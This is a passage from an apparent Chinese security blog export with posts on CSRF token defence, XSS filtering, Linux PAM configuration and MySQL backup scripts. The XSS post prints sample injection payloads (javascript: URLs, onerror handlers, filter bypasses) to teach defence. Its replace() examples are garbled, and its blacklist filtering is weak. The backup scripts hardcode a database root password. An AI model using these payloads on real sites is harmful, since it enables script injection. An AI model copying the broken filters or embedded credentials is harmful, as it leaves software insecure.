或者拷贝下来的网页中可能会含有用户的会话信息，这种信息一旦被恶意用户获得，就能造成极大的危害。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;因此，一个正确的令牌设计应该是使用 Session 信息做 Hash，用得出的哈希值来做 CSRF 的令牌。 使用验证图片，这种方法的出现的作用是对于机器人暴力攻击的防止。但在 CSRF 的防范上，也有一些安全性要求比较高的的应用程序结合验证图片和一次性令牌来做双重保护。由于这种图片验证信息很难被恶意程序在客户端识别，因此能够提高更强的保护。当客户端的浏览器可能已经处于一种不安全的环境中的情况下（比如客户端的安全级别设置较低，客户端浏览器安装了不安全的插件等）。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;以上给的这些只是防范 CSRF 的比较通用的一些方法，Web 开发人员可以根据自己对自己的应用程序的功能的理解来确定安全级别的要求从而选择使用不同的保护措施，也推荐在同一应用程序内部结合使用多种方法来进行保护。 总结&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;CSRF 攻击作为一个存在已久的攻击方式，在大量的商业网站上都可以找出，应用本文的知识作出一个合理的分析，有针对性的提出改进方案才是本文作者希望看到的，在即不损害应用程序的性能的前提下，提高安全性；而对即将开发的网络应用程序来说，深刻理解其的危害性，在设计阶段就考虑到对 CSRF 的防范，无疑能收到更好的效果。]]></content>
      <tags>
        <tag>Linux安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[XSS攻击的防范]]></title>
    <url>%2F2017%2F08%2F17%2FLinux%E5%AE%89%E5%85%A8%2F4.%20XSS%E6%94%BB%E5%87%BB%E7%9A%84%E9%98%B2%E8%8C%83%2F</url>
    <content type="text"><![CDATA[XSS攻击的防范&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;过滤”&lt;”和”&gt;”标记XSS跨站攻击的最终目标是引入script代码在用户的浏览器中执行，所以最基本最简单的过滤方法，就是转换”&lt;”和’&gt;”标记。 12replace(str, "&lt;", "&lt;")replace(str, "&gt;", "&gt;") HTML属性过滤&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;使用上述的代码可以过滤掉”&lt;”和”&gt;”标记，让攻击者无法构造HTML标记。但是，攻击者可能会利用已存在的属性，如插入图片功能，将图片的路径属性修改为一段script代码，如 1&lt;img src="javascript:alert(/XSS攻击/)" width=100&gt; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;上述代码执行后，同样可以实现跨站的目的。而且很多的HTML标记里属性都支持“javascript:跨站代码”的形式，因此就需要对攻击者输入的数据进行如下转换： 123replace(str, "javascript:", "")replace(str, "jscript:", "")replace(str, "vbscript:", "") &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;一旦用户输入的语句中含有”javascript”，”jscript”，”vbscript”，都用空白代替。 过滤特殊字符：&amp;、回车和空格&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;因为HTML属性的值，可支持”&amp;#ASCii”的形式进行表示，前面的跨站代码就可以换成这样： 1&lt;img src="javascript:alert(/XSS攻击/)" width=100&gt; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;即可突破过滤程序，继续进行跨站攻击，使用代码： 1replace(str, "&amp;", "&amp;") &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;上述代码将”&amp;”替换为了”&amp;”，于是后面的语句就变形失效了。但是还有其他的方式绕过过滤，因为过滤关键字的方式具有很多的漏洞。攻击者可以构造下面的攻击代码： 1&lt;img src="javas cript:alert(/XSS攻击/)" width=100&gt; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这里关键字被空格，准确的说是Tab键进行了拆分，上面的代码就又失效了，这样就有考虑将Tab空格过滤，防止此类的跨站攻击。 HTML属性跨站的彻底防范&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;即使程序设计者彻底过滤了各种危险字符，确实给攻击者进行跨站入侵带来了麻烦，攻击者依然可以利用程序的缺陷进行攻击，因为攻击者可以利用前面说的属性和事件机制，构造执行script代码。例如，有下面这样一个图片标记代码： 1&lt;img src="#" onerror=alert(/跨站/)&gt; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这是一个利用onerror事件的典型跨站攻击示例，于是许多程序设计者对此事件进行了过滤，一旦发现关键字”onerror”，就进行转换过滤。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;然而攻击者可以利用的时间跨站方法，并不只有onerror一种，各种各样的属性都可以进行构造跨站攻击。例如： 1&lt;img src="#" style="Xss:expression(alert(/跨站/));"&gt; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这样的事件属性，同样是可以实现跨站攻击的。可以注意到，在“src=”#””和“style”之间有一个空格，也就是说属性之间需要空格分隔，于是程序设计者可能对空格进行过滤，以防范此类的攻击。但是过滤了空格之后，同样可以被攻击者突破。 1&lt;img src="#"/**/onerror=alert(/跨站/) width=100&gt; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这段代码利用了脚本语言的规则漏洞，在脚本语言中的注释会被当成一个空白来表示。所以注释代码就简介的达到了空格的效果，使语句得以执行。]]></content>
      <tags>
        <tag>Linux安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux可插拔认证模块（PAM）的配置文件、工作原理与流程]]></title>
    <url>%2F2017%2F08%2F17%2FLinux%E5%AE%89%E5%85%A8%2F2.%20Linux%E5%8F%AF%E6%8F%92%E6%8B%94%E8%AE%A4%E8%AF%81%E6%A8%A1%E5%9D%97%EF%BC%88PAM%EF%BC%89%E7%9A%84%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E3%80%81%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86%E4%B8%8E%E6%B5%81%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[Linux可插拔认证模块（PAM）的配置文件、工作原理与流程&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;PAM的配置文件： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;我们注意到，配置文件也放在了在应用接口层中，他与PAM API配合使用，从而达到了在应用中灵活插入所需鉴别模块的目的。他的作用主要是为应用选定具体的鉴别模块，模块间的组合以及规定模块的行为。下面是一个示例配置文件： 123456789101112131415161718cat /etc/pam.d/system-auth：#%PAM-1.0# This file is auto-generated.# User changes will be destroyed the next time authconfig is run.auth required /lib/security/$ISA/pam_env.soauth sufficient /lib/security/$ISA/pam_unix.so likeauth nullokauth required /lib/security/$ISA/pam_deny.so account required /lib/security/$ISA/pam_unix.soaccount sufficient /lib/security/$ISA/pam_succeed_if.so uid &lt; 100 quietaccount required /lib/security/$ISA/pam_permit.so password requisite /lib/security/$ISA/pam_cracklib.so retry=3password sufficient /lib/security/$ISA/pam_unix.so nullok use_authtok md5 shadow nispassword required /lib/security/$ISA/pam_deny.so session required /lib/security/$ISA/pam_limits.sosession required /lib/security/$ISA/pam_unix.so &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;我们可以看到,配置文件有许多配置项(每行对应一个配置项)组成，每一行又分为四列(每列对应一栏)： 第一栏 认证鉴别接口类型：&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;指明程序所使用的PAM的认证接口类型，其实对应了刚才所说的四类接口： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;auth：表示鉴别类接口模块类型用于检查用户和密码，并分配权限； &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这种类型的模块为用户验证提供两方面服务。让应用程序提示用户输入密码或者其他标记，确认用户合法性；通过他的凭证许可权限，设定组成员关系或者其他优先权。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;account：表示账户类接口，主要负责账户合法性检查，确认帐号是否过期，是否有权限登录系统等； &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这种模块执行的是基于非验证的帐号管理。他主要用于限制/允许用户对某个服务的访问时间，当前有效的系统资源（最多可以多少用户），限制用户位置（例如：root只能通过控制台登录）。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;多数情况下auth和account会一起用来对用户登录和使用服务的情况进行限制。这样的限制会更加完 整。比如下面是一个具体的例子：login是一个应用程序。Login要完成两件工作——首先查询用户，然后为用户提供所需的服务，例如提供一个shell程序。通常Login要求用户输入名称和密码进行验证。当用户名输入的时候，系统自然会去比对该用户是否是一个合法用户，是否在存在于本地或者远程的用户数据库中。如果该账号确实存在，那么是否过期。这些个工作是由account接口来负责。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果用户满足上述登录的前提条件，那么他是否具有可登录系统的口令，口令是否过期等。这个工作 就要由auth接口来负责了，他通常会将用户口令信息加密并提供给本地（/etc/shadow）或者远程的(ldap，kerberos等)口令验证方式进行验证。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果用户能够登录成功，证明auth和account的工作已经完成。但整个验证过程并没有完全结束。因为还有一些其他的问题没有得到确认。例如，用户能够在服务器上同时开启多少个窗口登录，用户可以在登录之后使用多少终端多长时间，用户能够访问哪些资源和不能访问哪些资源等等。也就是说登录之后的后续验证和环境定义等还需要其他的接口。这就是我们下面要提到的两组接口： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;session：会话类接口。实现从用户登录成功到退出的会话控制； &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;处理为用户提供服务之前/后需要做的些事情。包括：开启/关闭交换数据的信息，监视目录等，设置用户会话环境等。也就是说这是在系统正式进行服务提供之前的最后一道关口。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;password：口令类接口。控制用户更改密码的全过程。也就是有些资料所说的升级用户验证标记。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注意，上述接口在使用的时候，每行只能指定一种接口类型，如果程序需要多种接口的话，可在多行中分别予以规定。 第二栏 control_flag控制位：&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;规定如何处理PAM模块鉴别认证的结果，简而言之就是鉴别认证成功或者失败之后会发生什么事，如何进行控制。单个应用程序可以调用多种底层模块，通常称为“堆叠”。对应于某程序按照配置文件中出现顺序执行的所有模块成为“堆”，堆中的各模块的地位与出错时的处理方式由control_flag栏的取值决定，他的四种可能的取值分别为required、Requisite、sufficient或_optional： required：表示该行以及所涉及模块的成功是用户通过鉴别的必要条件。换句话说，只有当对应于应用程序的所有带 required标记的模块全部成功后，该程序才能通过鉴别。同时，如果任何带required标记的模块出现了错误，PAM并不立刻将错误消息返回给应用程序，而是在所有模块都调用完毕后才将错误消息返回调用他的程序。 反正说白了，就是必须将所有的模块都执行一次，其中任何一个模块验证出错，验证都会继续进行，并在执行完成之后才返回错误信息。这样做的目的就是不让用户知道自己被哪个模块拒绝，通过一种隐蔽的方式来保护系统服务。就像设置防火墙规则的时候将拒绝类的规则都设置为drop一样，以致于用户在访问网络不成功的时候无法准确判断到底是被拒绝还是目标网络不可达。 requisite：与required相仿，只有带此标记的模块返回成功后，用户才能通过鉴别。不同之处在于其一旦失败就不再执行堆中后面的其他模块，并且鉴别过程到此结束，同时也会立即返回错误信息。与上面的required相比，似乎要显得更光明正大一些。 sufficient：表示该行以及所涉及模块验证成功是用户通过鉴别的充分条件。也就是说只要标记为 sufficient的模块一旦验证成功，那么PAM便立即向应用程序返回成功结果而不必尝试任何其他模块。即便后面的层叠模块使用了requisite或者required控制标志也是一样。当标记为sufficient的模块失败时，sufficient模块会当做 optional对待。因此拥有sufficient 标志位的配置项在执行验证出错的时候并不会导致整个验证失败，但执行验证成功之时则大门敞开。所以该控制位的使用务必慎重。 optional：他表示即便该行所涉及的模块验证失败用户仍能通过认证。在PAM体系中，带有该标记的模块失败后将继续处理下一模块。也就是说即使本行指定的模块验证失败，也允许用户享受应用程序提供的服务。使用该标志，PAM框架会忽略这个模块产生的验证错误，继续顺序执行下一个层叠模块。 include：表示在验证过程中调用其他的PAM配置文件。在RHEL系统中有相当多的应用通过完整调用/etc/pam.d/system-auth来实现认证而不需要重新逐一去写配置项。这也就意味着在很多时候只要用户能够登录系统，针对绝大多数的应用程序也能同时通过认证。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;另外还有一种比较复杂的格式为value = action的语法来设置控制标志，标志之间会以空格分开。格式如下： 1value1 = action1 value2 = action2 …… &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;其中value可以是下列Linux PAM库的返回值： success、open_err、symbol_err、service_err、 system_err、buf_err、perm_denied、auth_err、cred_insufficient、authinfo_unavail、user_unknown、maxtries、new_authtok_reqd、acct_expired、 session_err、cred_unavail、cred_expired、cred_err、no_module_data、conv_err、 authtok_err、authtok_recover_err、authtok_lock_busy、authtok_disable_aging、 try_again、ignore、abort、authtok_expired、module_unknown、bad_item和default。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;最后一个(default)能够用来设置上面的返回值无法表达的行为。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;actionN可以是一个非负整数或者是下面的记号之一：ignore、ok、done、bad、die和reset。如果是非负整数J，就表示需要忽略后面J个同样类型的模块。通过这种方式，系统管理者可以更加灵活地设置层叠模块，模块的层叠路径由单个模块的反应决定。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;关于这几个记号的详细解释： ignore：如果使用层叠模块，那么这个模块的返回值将被忽略，不会被应用程序知道。 bad：他表示这个返回码应该被看作是模块验证失败的标志。如果这个模块是层叠模块的第一个验证失败的模块，那么他的状态值就是整个层叠模块验证的状态值和结果。 die：终止层叠模块验证过程，立刻返回到应用程序。 ok：告诉PAM这个模块的返回值将直接作为所有层叠模块的返回值。也就是说，如果这个模块前面的模块返回状态是PAM_SUCCESS，那这个返回值就会覆盖前面的返回状态。注意：如果前面的模块的返回状态表示模块验证失败，那么不能使用这个返回值再加以覆盖。 done：终止后续层叠模块的验证，把控制权立刻交回应用程序。 reset：清除所有层叠模块的返回状态，从下一个层叠模块重新开始验证。 第三栏 module_path即所使用模块的全路径名称。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;以Red Hat Enterprise Linux（RHEL）为例，值得注意的是在i368/i686和x86_64系统中模块的全路径名称是不一样的。所以当有的时候用户将一些PAM的配置文件从原来系统复制到新的系统时，如果两种系统架构不同，那么不修改模块路径名称则可能导致PAM报错。 第四栏 options用于向特定模块传递相关的选项，然后由模块分析解释这些选项。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;比如使用此栏打开模块调试模式，或向某模块传递诸如超时值之类的参数等。另外他还用于支持下文所述的口令映射技术。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果任一栏出现错误或某模块没有找到，那么所在行被忽略并将其作为严重错误进行记录。 PAM的工作原理与流程：&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;以RHEL系统为例，当pam安装之后有两大部分：在/lib/security目录下的各种pam模块以 及/etc/pam.d和/etc/pam.d目录下的针对各种服务和应用已经定义好的pam配置文件。当某一个有认证需求的应用程序需要验证的时候，一般在应用程序中就会定义负责对其认证的PAM配置文件。以 vsftpd为例，在它的配置文件/etc/vsftpd/vsftpd.conf中就有这样一行定义： 1pam_service_name=vsftpd &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;表示登录FTP服务器的时候进行认证是根据/etc/pam.d/vsftpd文件定义的内容进行。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;那么，当程序需要认证的时候已经找到相关的pam配置文件，认证过程是如何进行的？下面我们将通过解读/etc/pam.d/system-auth文件予以说明。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;首先要声明一点的是：system-auth是一个非常重要的pam配置文件，主要负责用户登录系统的认证工作。而且该文件不仅仅只是负责用户登录系统认证，其它的程序和服务通过include接口也可以调用到它，从而节省了很多重新自定义配置的工作。所以应该说该文件是系统安全的总开关和核心的pam配置文件。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;下面是/etc/pam.d/system-auth文件的全部内容： 123456789101112131415161718grep -v ^# /etc/pam.d/system-authauth required pam_env.soauth sufficient pam_unix.so nullok try_first_passauth requisite pam_succeed_if.so uid &gt;= 500 quietauth required pam_deny.so account required pam_unix.soaccount sufficient pam_succeed_if.so uid &lt; 500 quietaccount required pam_permit.so password requisite pam_cracklib.so try_first_pass retry=3password sufficient pam_unix.so md5 shadow nullok try_first_pass use_authtokpassword required pam_deny.so session optional pam_keyinit.so revokesession required pam_limits.sosession [success=1 default=ignore] pam_succeed_if.so service in crond quiet use_uidsession required pam_unix.so &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;第一部分表示，当用户登录的时候，首先会通过auth类接口对用户身份进行识别和密码认证。所以在该过程中验证会经过几个带auth的配置项。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;其中的第一步是通过pam_env.so模块来定义用户登录之后的环境变量， pam_env.so允许设置和更改用户登录时候的环境变量，默认情况下，若没有特别指定配置文件，将依 据/etc/security/pam_env.conf进行用户登录之后环境变量的设置。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;然后通过pam_unix.so模块来提示用户输入密码，并将用户密码与/etc/shadow中记录的密码信息进行对比，如果密码比对结果正确则允许用户登录，而且该配置项的使用的是“sufficient”控制位，即表示只要该配置项的验证通过，用户即可完全通过认证而不用再去走下面的认证项。不过在特殊情况下，用户允许使用空密码登录系统，例如当将某个用户在/etc/shadow中的密码字段删除之后，该用户可以只输入用户名直接登录系统。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;下面的配置项中，通过pam_succeed_if.so对用户的登录条件做一些限制，表示允许uid大于500的用户在通过密码验证的情况下登录，在Linux系统中，一般系统用户的uid都在500之内，所以该项即表示允许使用useradd命令以及默认选项建立的普通用户直接由本地控制台登录系统。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;最后通过pam_deny.so模块对所有不满足上述任意条件的登录请求直接拒绝，pam_deny.so是一个特殊的模块，该模块返回值永远为否，类似于大多数安全机制的配置准则，在所有认证规则走完之后，对不匹配任何规则的请求直接拒绝。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;第二部分的三个配置项主要表示通过account账户类接口来识别账户的合法性以及登录权限。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;第一行仍然使用pam_unix.so模块来声明用户需要通过密码认证。第二行承认了系统中uid小于500的系统用户的合法性。之后对所有类型的用户登录请求都开放控制台。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;第三部分会通过password口另类接口来确认用户使用的密码或者口令的合法性。第一行配置项表示需要的情况下将调用pam_cracklib来验证用户密码复杂度。如果用户输入密码不满足复杂度要求或者密码错，最多将在三次这种错误之后直接返回密码错误的提示，否则期间任何一次正确的密码验证都允许登录。需要指出的是，pam_cracklib.so是一个常用的控制密码复杂度的pam模块，关于其用法举例我们会在之后详细介绍。之后带pam_unix.so和pam_deny.so的两行配置项的意思与之前类似。都表示需要通过密码认证并对不符合上述任何配置项要求的登录请求直接予以拒绝。不过用户如果执行的操作是单纯的登录，则这部分配置是不起作用的。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;第四部分主要将通过session会话类接口为用户初始化会话连接。其中几个比较重要的地方包括，使用pam_keyinit.so表示当用户登录的时候为其建立相应的密钥环，并在用户登出的时候予以撤销。不过该行配置的控制位使用的是optional，表示这并非必要条件。之后通过pam_limits.so限制用户登录时的会话连接资源，相关pam_limit.so配置文件是/etc/security/limits.conf，默认情况下对每个登录用户都没有限制。关于该模块的配置方法在后面也会详细介绍。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;可见，不同应用程序通过配置文件在认证过程中调用不同的pam模块来定制具体的认证流程。其中我们不难看出，其实可以根据实际的需要对pam的配置文件进行修改以满足不同的认证需求，例如下面的例子： 12345678910111213141516171819202122#%PAM-1.0# This file is auto-generated.# User changes will be destroyed the next time authconfig is run.auth required pam_env.soauth required pam_tally.so onerr=fail deny=5auth sufficient pam_unix.so nullok try_first_passauth requisite pam_succeed_if.so uid &gt;= 500 quietauth required pam_deny.so account required pam_unix.soaccount sufficient pam_succeed_if.so uid &lt; 500 quietaccount required pam_permit.so password requisite pam_cracklib.so try_first_pass retry=3 minlen=10 lcredit=-1 ucredit=-1 dcredit=-1 ocredit=-1 difok=6password requisite pam_passwdqc.so use_first_pass enforce=everyonepassword sufficient pam_unix.so md5 remember=6 shadow nullok try_first_pass use_authtokpassword required pam_deny.so session optional pam_keyinit.so revokesession required pam_limits.sosession [success=1 default=ignore] pam_succeed_if.so service in crond quiet use_uidsession required pam_unix.so &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在其中就增加了对用户密码修改时复杂度的限制，用户多次错误输入密码之后的锁定限制以及用户使用密码历史等限制选项。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;所以我们通过对上述system-auth配置文件的修改，模块的增加和选项的变化，从很大的程度上增加了用户登录验证的安全性要求。我们会在之后的文章中对该配置进行详细说明。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;另外也一定需要注意，在整个的PAM配置文件当中，配置项以及模块调用的逻辑顺序非常关键。因为PAM是按照配置项的先后顺序来进行验证。错误的模块调用顺序很可能导致严重的安全问题甚至系统错误。所以对PAM配置进行修改的时候务必要考虑这一点。]]></content>
      <tags>
        <tag>Linux安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CSRF攻击防范]]></title>
    <url>%2F2017%2F08%2F17%2FLinux%E5%AE%89%E5%85%A8%2F1.%20CSRF%E6%94%BB%E5%87%BB%E9%98%B2%E8%8C%83%2F</url>
    <content type="text"><![CDATA[CSRF攻击防范&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;CSRF攻击必须依次完成以下两个条件： 登录受信任网站A，并在本地生成Cookie。 在不登出A的情况下，访问危险网站B。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;关闭浏览器不能结束一个会话，但大多数人都会错误的认为关闭浏览器就等于退出登录/结束会话了 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;CSRF攻击形成的原因： 网站违反了HTTP协议，使用GET请求更新资源(非常危险). 使用无校验的表单 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;CSRF攻击是源于WEB的隐式身份验证机制！(比如你在A网站登录后,在同一个浏览器的tab页打开B网站网页, 而B网站网页有一些脚本链接到A网站并偷偷的发送请求更新你账号的信息.如果没有防CSRF攻击,这样是可以实现的.) &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;WEB的身份验证机制虽然可以保证一个请求是来自于某个用户的浏览器，但却无法保证该请求是用户批准发送的！ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;CSRF防范方式：客户端页面增加伪随机数。每次需要修改该用户的数据库信息时必须带上该随机数,否则不受理. &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;解决办法: 在Form表单加一个hidden field，里面是服务端生成的足够随机数的一个Token(恶意网站猜不到也无法获取到相同的Token), 然后使用一个拦截器interceptor来检查每一个非get请求, 看该token与服务器token是否一致,不一致的不受理该请求. &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;以下是token 的工具管理类: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859package com.xxx.xxx.util;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpSession;import java.util.UUID;/** * CSRFtoken管理类 * * @author 作者 yss * @version 版本号 v1.0 */public final class CSRFTokenManager &#123; /** * 约定规范：表单提交时的token的input的name属性必须为该值才能获取到后台返回的token。 * 下面是使用EL表达式接收从后台返回的token参数 * 如: &lt;input type="hidden" id="CSRFToken" value="$&#123;CSRFToken&#125;"&gt; */ public static final String CSRF_PARAM_NAME = "CSRFToken"; /** * 存放在session中的token名称(跟上面的name属性值不一定一样) */ public static final String CSRF_TOKEN_FOR_SESSION_ATTR_NAME = CSRFTokenManager.class.getName() + ".tokenval"; /** *从session中获取token字符串 * @param session * @return */ public static String getTokenForSession(HttpSession session) &#123; String token = null; //保证session只存在一个token，避免多线程情况下产生冲突。 synchronized (session) &#123; token = (String) session.getAttribute(CSRF_TOKEN_FOR_SESSION_ATTR_NAME);//尝试获取session中的token if (null == token) &#123;//如果session中没有token，就重新生成一个token token = UUID.randomUUID().toString(); session.setAttribute(CSRF_TOKEN_FOR_SESSION_ATTR_NAME, token); &#125; &#125; return token; &#125; /** *获取到request中的token值。 * @param request * @return */ public static String getTokenFromRequest(HttpServletRequest request) &#123; return request.getParameter(CSRF_PARAM_NAME); &#125;//构造器 private CSRFTokenManager() &#123; &#125;&#125; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;后台返回token参数给页面: &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;String token = CSRFTokenManager.getTokenForSession(request.getSession());//uuid生成的随机token &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;modelAndView.addObject(CSRFTokenManager.CSRF_PARAM_NAME, token);//添加token参数 &lt;%–token–%&gt; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;编写代码要符合HTTP规范,不要使用GET请求更新资源 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在非GET请求中带上token 参数(ajax请求也要),然后使用拦截器检查. &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;对于受到CSRF攻击使用的是抛自定义异常,然后使用springmvc全局异常进行处理 123456789101112131415161718192021222324252627282930313233343536package com.xxx.xxx.interceptor;import com.xxx.xxx.exception.CSRFException;import com.xxx.xxx.util.CSRFTokenManager;import org.springframework.web.servlet.ModelAndView;import org.springframework.web.servlet.handler.HandlerInterceptorAdapter;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;/** * 对于未登录用户的请求进行拦截,确保用户已经登录,然后进行后续的网页请求 * * @Author yss * @Version 1.0 * @see */public class CSRFInterceptor extends HandlerInterceptorAdapter &#123; @Override public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception &#123;// Enumeration parasm = request.getParameterNames(); if (!"GET".equals(request.getMethod())) &#123;//非get请求 String CSRFToken = CSRFTokenManager.getTokenFromRequest(request);//页面传过来的csrf参数 if (CSRFToken == null || !CSRFToken.equals(CSRFTokenManager.getTokenForSession(request.getSession()))) &#123;//token不对应 throw new CSRFException("CSRF攻击");//抛异常后将会进入springmvc全局异常处理体系 &#125; &#125; return true; &#125; @Override public void postHandle(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView) throws Exception &#123; super.postHandle(request, response, handler, modelAndView); &#125;&#125; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在spring的配置文件中添加拦截器使其生效 1234567&lt;mvc:interceptors&gt; &lt;!-- 防止CSRF攻击的拦截器 --&gt; &lt;mvc:interceptor&gt; &lt;mvc:mapping path="/**"/&gt; &lt;bean id="CSRFInterceptor" class="com.xxx.xxx.interceptor.CSRFInterceptor"&gt;&lt;/bean&gt; &lt;/mvc:interceptor&gt;&lt;/mvc:interceptors&gt;]]></content>
      <tags>
        <tag>Linux安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[shell 备份 mysql]]></title>
    <url>%2F2017%2F08%2F17%2FShell%2F5.%20shell%20%E5%A4%87%E4%BB%BD%20mysql%2F</url>
    <content type="text"><![CDATA[shell 备份 mysql 创建备份目录和文件 123mkdir/srv/bakmysqlmkdir/srv/bakmysql/dailytouch/srv/bakmysql/mysqlbak.log 启用二进制日志 12cd /etc/vi my.cnf &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在[mysqld]添加 1log-bin=/var/lib/mysql/mysql-bin.log &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;然后重启mysqld服务器 设置crontab任务，每天执行备份脚本 12cd /etc/vi crontab &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;添加如下脚本 120 0 * * 0 root/usr/sbin/mysqlfullbak #（每天0点执行完全备份脚本）0 1 * * * root/usr/sbin/mysqldailybak # (每天凌晨1点执行增量备份脚本) &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;脚本内容： 完全备份脚本 1234567891011121314151617181920212223242526272829303132#!/bin/bash# Name:mysqlfullbak# This is mysql mysqlfullbak scripts# By Cloudsoar# Last Modify:2012-05-10#定义脚本存放路径scriptsDir=/usr/sbin#定义用户名及密码user=rootuserPWD=9dspod8a#定义要备份的数据库database=GoToMyCloudDB#定义完全备份文件存放路径bakDir=/srv/bakmysqleMailFile=$bakDir/email.txteMail=xia.yan@cloudsoar.com#定义日志文件LogFile=$bakDir/mysqlbak.logDATE=`date +%Y%m%d`echo " " &gt;&gt; $LogFileecho " " &gt;&gt; $LogFileecho "--------------------------" &gt;&gt; $LogFileecho $(date +"%y-%m-%d %H:%M:%S") &gt;&gt;$LogFileecho "-----------------" &gt;&gt; $LogFilecd $bakDirDumpFile=$DATE.sqlmysqldump --flush-logs -u$user -p$userPWD --quick $database &gt;$DumpFileecho "Dump Done" &gt;&gt; $LogFileecho "[$DumpFile]Backup Success!" &gt;&gt; $LogFiledaily_databakDir=$bakDir/dailycd $bakDir/dailyfind $daily_databakDir -name "daily*" -type f -mtime +35 -exec rm &#123;&#125; \; &gt; /dev/null 2&gt;&amp;1 增量备份脚本 12345678910111213141516171819202122232425262728293031323334353637383940414243444546#!/bin/bash# Name:mysqldailybak# This ia mysql mysqldailybak scripts# By Cloudsoar# Last modify:2012-05-10#定义用户名及密码user=rootuserPWD=9dspod8a#定义数据库database=GotoMyCloudDB/usr/bin/mysqladmin -u$user -p$userPWD flush-logsdaily_databakDir=/srv/bakmysql/daily#定义MYSQL数据目录mysqlDataDir=/srv/mysqleMailFile=$daily_databakDir/email.txteMail=xia.yan@cloudsoar.comDATE=`date +%Y%m%d`logFile=$daily_databakDir/mysql$DATE.logecho " " &gt; $eMailFileecho "-----------------------" &gt;&gt; $eMailFile echo $(date +"%y-%m-%d %H:%M:%S") &gt;&gt; 